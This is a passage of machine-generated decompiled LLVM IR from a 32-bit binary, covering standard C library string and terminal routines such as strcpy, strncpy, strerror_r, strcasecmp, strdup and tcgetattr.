  %v0_8051aff = phi i32 [ %v0_8051af9, %entry ], [ %v0_8051aff.pre, %dec_label_pc_8051afd ]
  %v2_8051aff = urem i32 %v0_8051aff, 2
  %v3_8051aff = icmp eq i32 %v2_8051aff, 0
  br i1 %v3_8051aff, label %dec_label_pc_8051b04, label %dec_label_pc_8051b03

dec_label_pc_8051b03:                             ; preds = %dec_label_pc_8051aff
  %v0_8051b03 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b03 = inttoptr i32 %v0_8051b03 to i8*
  %v2_8051b03 = load i8, i8* %v1_8051b03, align 1
  %v3_8051b03 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051b03 = inttoptr i32 %v3_8051b03 to i8*
  store i8 %v2_8051b03, i8* %v4_8051b03, align 1
  %v5_8051b03 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051b03 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051b03 = load i1, i1* @df, align 1
  %v8_8051b03 = select i1 %v7_8051b03, i32 -1, i32 1
  %v9_8051b03 = add i32 %v8_8051b03, %v5_8051b03
  %v10_8051b03 = add i32 %v8_8051b03, %v6_8051b03
  store i32 %v9_8051b03, i32* %edi.global-to-local, align 4
  store i32 %v10_8051b03, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b04

dec_label_pc_8051b04:                             ; preds = %dec_label_pc_8051aff, %dec_label_pc_8051b03
  store i32 %v4_8051af0, i32* %eax.global-to-local, align 4
  %v2_8051b08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b08, i32* @esi, align 4
  ret i32 %v4_8051af0

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b04, { 1, 0 }
  uselistorder label %dec_label_pc_8051aff, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051b0c = load i32, i32* @edi, align 4
  %v4_8051b15 = ptrtoint i8* %arg1 to i32
  %v5_8051b19 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051b19 = ptrtoint i8* %v5_8051b19 to i32
  store i32 %v6_8051b19, i32* @ecx, align 4
  store i32 %v0_8051b0c, i32* @edi, align 4
  ret i32 %v4_8051b15

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b25 = load i32, i32* @esi, align 4
  store i32 %v0_8051b25, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051b2d = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051b2d, i32* %edi.global-to-local, align 4
  %v4_8051b31.pre = load i32, i32* @eax, align 4
  %v8_8051b31.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051b31

dec_label_pc_8051b31:                             ; preds = %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge, %entry
  %v2_8051b32 = phi i32 [ %v7_8051b32, %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge ], [ %v4_8051b2d, %entry ]
  %v8_8051b31 = phi i1 [ %v5_8051b32, %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge ], [ %v8_8051b31.pre, %entry ]
  %v4_8051b31 = phi i32 [ %v0_8051b33, %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge ], [ %v4_8051b31.pre, %entry ]
  %v7_8051b31 = phi i32 [ %v0_8051b31.pre, %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge ], [ %arg2, %entry ]
  %v1_8051b31 = inttoptr i32 %v7_8051b31 to i8*
  %v2_8051b31 = load i8, i8* %v1_8051b31, align 1
  %v3_8051b31 = zext i8 %v2_8051b31 to i32
  %v5_8051b31 = and i32 %v4_8051b31, -256
  %v6_8051b31 = or i32 %v3_8051b31, %v5_8051b31
  store i32 %v6_8051b31, i32* %eax.global-to-local, align 4
  %v9_8051b31 = select i1 %v8_8051b31, i32 -1, i32 1
  %v10_8051b31 = add i32 %v7_8051b31, %v9_8051b31
  store i32 %v10_8051b31, i32* %esi.global-to-local, align 4
  %v3_8051b32 = inttoptr i32 %v2_8051b32 to i8*
  store i8 %v2_8051b31, i8* %v3_8051b32, align 1
  %v4_8051b32 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051b32 = load i1, i1* @df, align 1
  %v6_8051b32 = select i1 %v5_8051b32, i32 -1, i32 1
  %v7_8051b32 = add i32 %v6_8051b32, %v4_8051b32
  store i32 %v7_8051b32, i32* %edi.global-to-local, align 4
  %v0_8051b33 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051b33 = trunc i32 %v0_8051b33 to i8
  %v4_8051b33 = icmp eq i8 %v3_8051b33, 0
  %v1_8051b35 = icmp eq i1 %v4_8051b33, false
  br i1 %v1_8051b35, label %dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge, label %dec_label_pc_8051b37

dec_label_pc_8051b31.dec_label_pc_8051b31_crit_edge: ; preds = %dec_label_pc_8051b31
  %v0_8051b31.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b31

dec_label_pc_8051b37:                             ; preds = %dec_label_pc_8051b31
  store i32 %v4_8051b2d, i32* %eax.global-to-local, align 4
  %v2_8051b3b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b3b, i32* @edx, align 4
  %v2_8051b3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b3c, i32* @esi, align 4
  ret i32 %v4_8051b2d

; uselistorder directives
  uselistorder i32 %v0_8051b33, { 1, 0 }
  uselistorder i32 %v7_8051b32, { 1, 0 }
  uselistorder i1 %v5_8051b32, { 1, 0 }
  uselistorder i32 %v4_8051b2d, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b55 = load i32, i32* @esi, align 4
  store i32 %v0_8051b55, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051b61 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051b61, i32* %edi.global-to-local, align 4
  %v1_8051b65 = add i32 %arg3, 1
  br label %dec_label_pc_8051b66

dec_label_pc_8051b66:                             ; preds = %dec_label_pc_8051b69, %entry
  %v3_8051b6a = phi i32 [ %v4_8051b61, %entry ], [ %v8_8051b6a, %dec_label_pc_8051b69 ]
  %v0_8051b66 = phi i32 [ %v1_8051b65, %entry ], [ %v0_8051b66.pre, %dec_label_pc_8051b69 ]
  %v1_8051b66 = add i32 %v0_8051b66, -1
  %v8_8051b66 = icmp eq i32 %v1_8051b66, 0
  store i32 %v1_8051b66, i32* @ecx, align 4
  br i1 %v8_8051b66, label %.loopexit, label %dec_label_pc_8051b69

dec_label_pc_8051b69:                             ; preds = %dec_label_pc_8051b66
  %v0_8051b69 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b69 = inttoptr i32 %v0_8051b69 to i8*
  %v2_8051b69 = load i8, i8* %v1_8051b69, align 1
  %v10_8051b69 = load i1, i1* @df, align 1
  %v11_8051b69 = select i1 %v10_8051b69, i32 -1, i32 1
  %v12_8051b69 = add i32 %v11_8051b69, %v0_8051b69
  store i32 %v12_8051b69, i32* %esi.global-to-local, align 4
  %v4_8051b6a = inttoptr i32 %v3_8051b6a to i8*
  store i8 %v2_8051b69, i8* %v4_8051b6a, align 1
  %v5_8051b6a = load i32, i32* %edi.global-to-local, align 4
  %v6_8051b6a = load i1, i1* @df, align 1
  %v7_8051b6a = select i1 %v6_8051b6a, i32 -1, i32 1
  %v8_8051b6a = add i32 %v7_8051b6a, %v5_8051b6a
  store i32 %v8_8051b6a, i32* %edi.global-to-local, align 4
  %v6_8051b6b = icmp eq i8 %v2_8051b69, 0
  %v1_8051b6d = icmp eq i1 %v6_8051b6b, false
  %v0_8051b66.pre = load i32, i32* @ecx, align 4
  br i1 %v1_8051b6d, label %dec_label_pc_8051b66, label %dec_label_pc_8051b6f

dec_label_pc_8051b6f:                             ; preds = %dec_label_pc_8051b69
  %v1_8051b6f = add i32 %v0_8051b66.pre, -1
  %v2_8051b70 = sext i8 %v2_8051b69 to i32
  %v4_8051b70 = inttoptr i32 %v8_8051b6a to i8*
  %v5_8051b70 = call i8* @_memset(i8* %v4_8051b70, i32 %v2_8051b70, i32 %v1_8051b6f)
  %v6_8051b70 = ptrtoint i8* %v5_8051b70 to i32
  store i32 %v6_8051b70, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8051b66, %dec_label_pc_8051b6f
  %v2_8051b76 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b76, i32* @edx, align 4
  %v2_8051b77 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b77, i32* @esi, align 4
  ret i32 %v4_8051b61

; uselistorder directives
  uselistorder i32 %v8_8051b6a, { 0, 2, 1 }
  uselistorder i8 %v2_8051b69, { 0, 2, 1 }
  uselistorder i32 %v1_8051b66, { 1, 0 }
  uselistorder i32 %v4_8051b61, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_8051b7c = ptrtoint i8* %tmp4 to i32
  %v8_8051b8f8 = icmp eq i32 %tmp, 0
  %v1_8051b909 = icmp eq i1 %v8_8051b8f8, false
  br i1 %v1_8051b909, label %dec_label_pc_8051b89, label %dec_label_pc_8051b92

dec_label_pc_8051b89:                             ; preds = %entry, %dec_label_pc_8051b8e
  %v1_8051b8f11 = phi i32 [ %v1_8051b8f, %dec_label_pc_8051b8e ], [ %tmp, %entry ]
  %v0_8051b9210 = phi i32 [ %v1_8051b8e, %dec_label_pc_8051b8e ], [ %v4_8051b7c, %entry ]
  %v1_8051b89 = inttoptr i32 %v0_8051b9210 to i8*
  %v2_8051b89 = load i8, i8* %v1_8051b89, align 1
  %v3_8051b89 = icmp eq i8 %v2_8051b89, 0
  br i1 %v3_8051b89, label %dec_label_pc_8051b92, label %dec_label_pc_8051b8e

dec_label_pc_8051b8e:                             ; preds = %dec_label_pc_8051b89
  %v1_8051b8e = add i32 %v0_8051b9210, 1
  %v1_8051b8f = add i32 %v1_8051b8f11, -1
  %v8_8051b8f = icmp eq i32 %v1_8051b8f, 0
  %v1_8051b90 = icmp eq i1 %v8_8051b8f, false
  br i1 %v1_8051b90, label %dec_label_pc_8051b89, label %dec_label_pc_8051b92

dec_label_pc_8051b92:                             ; preds = %dec_label_pc_8051b8e, %dec_label_pc_8051b89, %entry
  %v0_8051b92.lcssa = phi i32 [ %v4_8051b7c, %entry ], [ %v0_8051b9210, %dec_label_pc_8051b89 ], [ %v1_8051b8e, %dec_label_pc_8051b8e ]
  %v2_8051b92 = sub i32 %v0_8051b92.lcssa, %v4_8051b7c
  ret i32 %v2_8051b92

; uselistorder directives
  uselistorder i32 %v1_8051b8f, { 1, 0 }
  uselistorder i32 %v0_8051b9210, { 0, 2, 1 }
  uselistorder i32 %v4_8051b7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b89, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051b98 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v3_8051ba9 = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_8051bae = load i32, i32* @ebx, align 4
  store i32 %v0_8051b98, i32* @ebx, align 4
  ret i32 %v0_8051bae
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_8051bb8 = load i32, i32* @ebp, align 4
  %v0_8051bb9 = load i32, i32* @edi, align 4
  %v0_8051bba = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8051bca = icmp ugt i32 %arg1, 124
  br i1 %v6_8051bca, label %dec_label_pc_8051be7, label %dec_label_pc_8051bcc

dec_label_pc_8051bcc:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805b5e0.227 to i32), i32* @esi, align 4
  %v1_8051bdc4 = icmp eq i32 %arg1, 0
  %v1_8051bde11 = icmp eq i1 %v1_8051bdc4, false
  br i1 %v1_8051bde11, label %dec_label_pc_8051bd5, label %dec_label_pc_8051be0

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bcc, %dec_label_pc_8051bd5
  %v0_8051bd8 = phi i32 [ %v3_8051bd8, %dec_label_pc_8051bd5 ], [ %arg1, %dec_label_pc_8051bcc ]
  %v0_8051bdb = phi i32 [ %v1_8051bdb, %dec_label_pc_8051bd5 ], [ ptrtoint ([8 x i8]* @global_var_805b5e0.227 to i32), %dec_label_pc_8051bcc ]
  %v1_8051bd5 = inttoptr i32 %v0_8051bdb to i8*
  %v2_8051bd5 = load i8, i8* %v1_8051bd5, align 1
  %v7_8051bd5 = icmp eq i8 %v2_8051bd5, 0
  %v2_8051bd8 = zext i1 %v7_8051bd5 to i32
  %v3_8051bd8 = add i32 %v2_8051bd8, %v0_8051bd8
  %v16_8051bd8 = icmp eq i32 %v3_8051bd8, 0
  %v1_8051bdb = add i32 %v0_8051bdb, 1
  store i32 %v1_8051bdb, i32* @esi, align 4
  %v1_8051bde = icmp eq i1 %v16_8051bd8, false
  br i1 %v1_8051bde, label %dec_label_pc_8051bd5, label %dec_label_pc_8051be0

dec_label_pc_8051be0:                             ; preds = %dec_label_pc_8051bd5, %dec_label_pc_8051bcc
  %v0_8051be2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b5e0.227 to i32), %dec_label_pc_8051bcc ], [ %v1_8051bdb, %dec_label_pc_8051bd5 ]
  store i32 0, i32* @ebp, align 4
  %v1_8051be2 = inttoptr i32 %v0_8051be2 to i8*
  %v2_8051be2 = load i8, i8* %v1_8051be2, align 1
  %v3_8051be2 = icmp eq i8 %v2_8051be2, 0
  %v1_8051be5 = icmp eq i1 %v3_8051be2, false
  br i1 %v1_8051be5, label %dec_label_pc_8051be0.dec_label_pc_8051c16_crit_edge, label %dec_label_pc_8051be7

dec_label_pc_8051be0.dec_label_pc_8051c16_crit_edge: ; preds = %dec_label_pc_8051be0
  br label %dec_label_pc_8051c16

dec_label_pc_8051be7:                             ; preds = %dec_label_pc_8051be0, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8051bef = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8051bfb = bitcast i32* %stack_var_-17 to i8*
  %v7_8051bfb = call i32 @_uintmaxtostr(i8* %v6_8051bfb, i32 %arg1, i32 %v1_8051bef, i32 -10, i32 0)
  %v1_8051c03 = add i32 %v7_8051bfb, -14
  store i32 %v1_8051c03, i32* @esi, align 4
  %v5_8051c0d = inttoptr i32 %v1_8051c03 to i8*
  store i8* %v5_8051c0d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8051c03 to i16*
  %v6_8051c0e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805b5c2.228 to i32), i32 14)
  %v0_8051c25.pre = load i32, i32* @edi, align 4
  %v0_8051c27.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051c16:                             ; preds = %dec_label_pc_8051be0.dec_label_pc_8051c16_crit_edge, %dec_label_pc_8051be7
  %v0_8051c27 = phi i32 [ %v0_8051be2, %dec_label_pc_8051be0.dec_label_pc_8051c16_crit_edge ], [ %v0_8051c27.pre, %dec_label_pc_8051be7 ]
  %v0_8051c25 = phi i32 [ %arg3, %dec_label_pc_8051be0.dec_label_pc_8051c16_crit_edge ], [ %v0_8051c25.pre, %dec_label_pc_8051be7 ]
  %v4_8051c18 = icmp eq i32 %arg2, 0
  %v1_8051c1d = icmp eq i1 %v4_8051c18, false
  %v2_8051c25 = select i1 %v1_8051c1d, i32 %v0_8051c25, i32 0
  store i32 %v2_8051c25, i32* @edi, align 4
  %v5_8051c27 = inttoptr i32 %v0_8051c27 to i8*
  store i8* %v5_8051c27, i8** %stack_var_-108, align 4
  %v3_8051c28 = call i32 @strlen(i8* %v5_8051c27)
  %v1_8051c30 = add i32 %v3_8051c28, 1
  store i32 %v1_8051c30, i32* %ebx.global-to-local, align 4
  %v1_8051c33 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_8051c30, %v1_8051c33
  br i1 %tmp, label %dec_label_pc_8051c37, label %dec_label_pc_8051c3e

dec_label_pc_8051c37:                             ; preds = %dec_label_pc_8051c16
  store i32 %v1_8051c33, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8051c3e

dec_label_pc_8051c3e:                             ; preds = %dec_label_pc_8051c16, %dec_label_pc_8051c37
  %v0_8051c43 = phi i32 [ %v1_8051c30, %dec_label_pc_8051c16 ], [ %v1_8051c33, %dec_label_pc_8051c37 ]
  %v1_8051c3e = icmp eq i32 %v0_8051c43, 0
  br i1 %v1_8051c3e, label %dec_label_pc_8051c5a, label %dec_label_pc_8051c42

dec_label_pc_8051c42:                             ; preds = %dec_label_pc_8051c3e
  %v0_8051c44 = load i32, i32* @esi, align 4
  %v8_8051c45 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8051c45, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8051c49 = call i32 @memcpy(i16* %tmp45, i32 %v0_8051c44, i32 %v0_8051c43)
  %v1_8051c55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051c55 = add i32 %arg2, -1
  %v3_8051c55 = add i32 %v2_8051c55, %v1_8051c55
  %v4_8051c55 = inttoptr i32 %v3_8051c55 to i8*
  store i8 0, i8* %v4_8051c55, align 1
  br label %dec_label_pc_8051c5a

dec_label_pc_8051c5a:                             ; preds = %dec_label_pc_8051c3e, %dec_label_pc_8051c42
  %v0_8051c5a = load i32, i32* @ebp, align 4
  %v1_8051c5a = icmp eq i32 %v0_8051c5a, 0
  br i1 %v1_8051c5a, label %dec_label_pc_8051c65, label %dec_label_pc_8051c5e

dec_label_pc_8051c5e:                             ; preds = %dec_label_pc_8051c5a
  %v0_8051c5e = load i8*, i8** %stack_var_-108, align 4
  %v1_8051c5e = ptrtoint i8* %v0_8051c5e to i32
  %v2_8051c5e = call i32 @__errno_location(i32 %v1_8051c5e)
  %v0_8051c63 = load i32, i32* @ebp, align 4
  %v2_8051c63 = inttoptr i32 %v2_8051c5e to i32*
  store i32 %v0_8051c63, i32* %v2_8051c63, align 4
  %v0_8051c68.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051c65

dec_label_pc_8051c65:                             ; preds = %dec_label_pc_8051c5a, %dec_label_pc_8051c5e
  %v0_8051c68 = phi i32 [ 0, %dec_label_pc_8051c5a ], [ %v0_8051c68.pre, %dec_label_pc_8051c5e ]
  store i32 %v0_8051bba, i32* @esi, align 4
  store i32 %v0_8051bb9, i32* @edi, align 4
  store i32 %v0_8051bb8, i32* @ebp, align 4
  ret i32 %v0_8051c68

; uselistorder directives
  uselistorder i32 %v1_8051c33, { 1, 2, 0 }
  uselistorder i32 %v1_8051c30, { 1, 0, 2 }
  uselistorder i32 %v1_8051c03, { 1, 0, 2 }
  uselistorder i32 %v1_8051bdb, { 0, 2, 1 }
  uselistorder i32 %v3_8051bd8, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805b5e0.227 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051c65, { 1, 0 }
  uselistorder label %dec_label_pc_8051c5a, { 1, 0 }
  uselistorder label %dec_label_pc_8051c3e, { 1, 0 }
  uselistorder label %dec_label_pc_8051c16, { 1, 0 }
  uselistorder label %dec_label_pc_8051bd5, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8051c80 = inttoptr i32 %arg2 to i8*
  %v3_8051c80 = call i32 @memmove(i8* %v2_8051c80, i32 %arg1)
  ret i32 %v3_8051c80
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8051c8a = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c8a, i32* @ecx, align 4
  %v0_8051c94 = load i32, i32* bitcast (i32** @global_var_8062a28.229 to i32*), align 8
  br label %dec_label_pc_8051c9a

dec_label_pc_8051c9a:                             ; preds = %dec_label_pc_8051cb7, %entry
  %v0_8051cbd6 = phi i32 [ %v0_8051cbd7, %dec_label_pc_8051cb7 ], [ 0, %entry ]
  %v0_8051cb7 = phi i32 [ %v1_8051cb7, %dec_label_pc_8051cb7 ], [ %arg2, %entry ]
  %v0_8051cb8 = phi i32 [ %v1_8051cb8, %dec_label_pc_8051cb7 ], [ %v4_8051c8a, %entry ]
  %v12_8051c9a = icmp eq i32 %v0_8051cb8, %v0_8051cb7
  %.pre = inttoptr i32 %v0_8051cb8 to i8*
  br i1 %v12_8051c9a, label %dec_label_pc_8051cb2, label %dec_label_pc_8051c9e

dec_label_pc_8051c9e:                             ; preds = %dec_label_pc_8051c9a
  %v2_8051c9e = load i8, i8* %.pre, align 1
  %v3_8051c9e = zext i8 %v2_8051c9e to i32
  %v2_8051ca1 = mul nuw nsw i32 %v3_8051c9e, 2
  %v3_8051ca1 = add i32 %v2_8051ca1, %v0_8051c94
  %v4_8051ca1 = inttoptr i32 %v3_8051ca1 to i16*
  %v5_8051ca1 = load i16, i16* %v4_8051ca1, align 2
  %v6_8051ca1 = sext i16 %v5_8051ca1 to i32
  %v1_8051ca5 = inttoptr i32 %v0_8051cb7 to i8*
  %v2_8051ca5 = load i8, i8* %v1_8051ca5, align 1
  %v3_8051ca5 = zext i8 %v2_8051ca5 to i32
  %v2_8051ca8 = mul nuw nsw i32 %v3_8051ca5, 2
  %v3_8051ca8 = add i32 %v2_8051ca8, %v0_8051c94
  %v4_8051ca8 = inttoptr i32 %v3_8051ca8 to i16*
  %v5_8051ca8 = load i16, i16* %v4_8051ca8, align 2
  %v6_8051ca8 = sext i16 %v5_8051ca8 to i32
  %v2_8051cac = sub nsw i32 %v6_8051ca1, %v6_8051ca8
  %v12_8051cac = icmp eq i32 %v2_8051cac, 0
  store i32 %v2_8051cac, i32* @edx, align 4
  %v1_8051cb0 = icmp eq i1 %v12_8051cac, false
  br i1 %v1_8051cb0, label %dec_label_pc_8051cbb, label %dec_label_pc_8051cb2

dec_label_pc_8051cb2:                             ; preds = %dec_label_pc_8051c9a, %dec_label_pc_8051c9e
  %v0_8051cbd7 = phi i32 [ %v2_8051cac, %dec_label_pc_8051c9e ], [ %v0_8051cbd6, %dec_label_pc_8051c9a ]
  %v2_8051cb2 = load i8, i8* %.pre, align 1
  %v3_8051cb2 = icmp eq i8 %v2_8051cb2, 0
  br i1 %v3_8051cb2, label %dec_label_pc_8051cbb, label %dec_label_pc_8051cb7

dec_label_pc_8051cb7:                             ; preds = %dec_label_pc_8051cb2
  %v1_8051cb7 = add i32 %v0_8051cb7, 1
  %v1_8051cb8 = add i32 %v0_8051cb8, 1
  store i32 %v1_8051cb8, i32* @ecx, align 4
  br label %dec_label_pc_8051c9a

dec_label_pc_8051cbb:                             ; preds = %dec_label_pc_8051cb2, %dec_label_pc_8051c9e
  %v0_8051cbd = phi i32 [ %v0_8051cbd7, %dec_label_pc_8051cb2 ], [ %v2_8051cac, %dec_label_pc_8051c9e ]
  ret i32 %v0_8051cbd

; uselistorder directives
  uselistorder i32 %v1_8051cb8, { 1, 0 }
  uselistorder i32 %v0_8051cbd7, { 1, 0 }
  uselistorder i32 %v2_8051cac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051cb8, { 2, 1, 0 }
  uselistorder i32 %v0_8051cb7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051cb2, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051cc0 = load i32, i32* @edi, align 4
  %v0_8051cc1 = load i32, i32* @esi, align 4
  %v0_8051cc2 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cc2, i32* %stack_var_-12, align 4
  %v4_8051cc3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051cc3, i32* @edi, align 4
  %v3_8051ccb = call i32 @strlen(i8* %arg1)
  %v1_8051cd0 = add i32 %v3_8051ccb, 1
  store i32 %v1_8051cd0, i32* @esi, align 4
  %v2_8051cd6 = call i32 @malloc(i32 %v1_8051cd0)
  store i32 %v2_8051cd6, i32* %ebx.global-to-local, align 4
  %v1_8051ce0 = icmp eq i32 %v2_8051cd6, 0
  br i1 %v1_8051ce0, label %dec_label_pc_8051cf0, label %dec_label_pc_8051ce4

dec_label_pc_8051ce4:                             ; preds = %entry
  %v0_8051ce5 = load i32, i32* @esi, align 4
  %v0_8051ce6 = load i32, i32* @edi, align 4
  %tmp10 = inttoptr i32 %v2_8051cd6 to i16*
  %v6_8051ce8 = call i32 @memcpy(i16* %tmp10, i32 %v0_8051ce6, i32 %v0_8051ce5)
  %v0_8051cf0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051cf0

dec_label_pc_8051cf0:                             ; preds = %entry, %dec_label_pc_8051ce4
  %v0_8051cf0 = phi i32 [ 0, %entry ], [ %v0_8051cf0.pre, %dec_label_pc_8051ce4 ]
  %v2_8051cf2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051cf2, i32* @ebx, align 4
  store i32 %v0_8051cc1, i32* @esi, align 4
  store i32 %v0_8051cc0, i32* @edi, align 4
  ret i32 %v0_8051cf0

; uselistorder directives
  uselistorder i32 %v2_8051cd6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051cf0, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v3_8051d08 = inttoptr i32 %arg1 to i8*
  %v4_8051d08 = call i32 @strtok_r(i8* %v3_8051d08, i32 %tmp1, i32 ptrtoint (i32* @global_var_80670a0.230 to i32))
  ret i32 %v4_8051d08
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8051d20 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8051d25 = icmp eq i32 %v3_8051d20, 0
  %v1_8051d27 = zext i1 %v1_8051d25 to i32
  ret i32 %v1_8051d27
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051d42 = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v3_8051d42
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d4c = load i32, i32* @esi, align 4
  %v0_8051d4d = load i32, i32* @ebx, align 4
  store i32 %v0_8051d4d, i32* %stack_var_-8, align 4
  %v2_8051d51 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051d51, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8051d63 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8051d51)
  store i32 %v3_8051d63, i32* %eax.global-to-local, align 4
  store i32 %v3_8051d63, i32* @esi, align 4
  %v1_8051d6d = icmp eq i32 %v3_8051d63, 0
  %v1_8051d6f = icmp eq i1 %v1_8051d6d, false
  br i1 %v1_8051d6f, label %dec_label_pc_8051db4, label %dec_label_pc_8051d71

dec_label_pc_8051d71:                             ; preds = %entry
  %v3_8051d71 = load i32, i32* %stack_var_-44, align 4
  %v1_8051d75 = load i32, i32* @ebx, align 4
  %v2_8051d75 = inttoptr i32 %v1_8051d75 to i32*
  store i32 %v3_8051d71, i32* %v2_8051d75, align 4
  %v1_8051d7b = load i32, i32* @ebx, align 4
  %v2_8051d7b = add i32 %v1_8051d7b, 4
  %v3_8051d7b = inttoptr i32 %v2_8051d7b to i32*
  %v1_8051d82 = load i32, i32* @ebx, align 4
  %v2_8051d82 = add i32 %v1_8051d82, 8
